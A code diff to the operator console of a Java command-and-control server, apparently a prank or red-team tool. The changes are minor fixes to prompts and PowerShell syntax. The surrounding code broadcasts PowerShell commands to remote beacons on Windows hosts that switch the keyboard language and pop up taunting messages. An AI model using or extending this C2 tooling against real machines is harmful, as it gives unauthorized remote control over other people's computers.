@@ -113,6 +113,7 @@ public class C2ServerUserHandler implements Runnable{
         System.out.println(" / ^   ^   ^ | |__| |  / /     \\ \\  \\ \\/ /  / /     \\ \\  | |____   / /     \\ \\  | |  \\ \\| | | |_____  | |  | | | |_____   ^    ^    \\");
         System.out.println("/ ^ ^ ^  ^  ^|______| /_/       \\_\\  \\__/  /_/       \\_\\ |______| /_/       \\_\\ |_|   \\___| |_______| |_|  |_| |_______|    ^      ^ \\");
         System.out.println("oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo");
+        System.out.println();
     }
 
     private void printHome(){
@@ -344,7 +345,7 @@ public class C2ServerUserHandler implements Runnable{
                 String target = "";
                 HashSet<String> validInputs = new HashSet<>(Arrays.asList("1","2","3","4","5"));
                 if(validInputs.contains(userInput)){
-                    System.out.println("Enter IP address of target, 'Windows','Linux', or 'All");
+                    System.out.println("Enter IP address of target, 'Windows','Linux', or 'All'");
                     System.out.print(" >> ");
                     target = userInputScanner.nextLine();
                 }
@@ -358,7 +359,7 @@ public class C2ServerUserHandler implements Runnable{
                     commands += "[System.Windows.MessageBox]::Show('Have Fun Learning French MF');";
                     commands += "Start-Sleep -Seconds 60;";
                     commands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
-                    commands += "Set-WinUserLanguageList en-US; -force";
+                    commands += "Set-WinUserLanguageList en-US -force;";
                     C2server.broadcastToBeacons("Command Windows " + target + "_" + commands);
                 } else if (userInput.equals("3")){
                     // Change their Keybaord language every 30 seconds
@@ -381,7 +382,7 @@ public class C2ServerUserHandler implements Runnable{
                 } else if (userInput.equals("4")){
                     // Change it back to english in case we mess up
                     String commands = "";
-                    commands += "Set-WinUserLanguageList en-US; -force;";
+                    commands += "Set-WinUserLanguageList en-US -force;";
                     commands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
                     commands += "[System.Windows.MessageBox]::Show('Sorry about that here's english')";
                     C2server.broadcastToBeacons("Command Windows " + target + "_" + commands);
@@ -390,6 +391,7 @@ public class C2ServerUserHandler implements Runnable{
                     String commands = "";
                     commands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
                     System.out.println("Enter A Message to Display: ");
+                    System.out.print(" >> ");
                     String message = userInputScanner.nextLine();
                     commands += "[System.Windows.MessageBox]::Show('"+ message+ "');";
                     C2server.broadcastToBeacons("Command Windows " + target + "_" + commands);
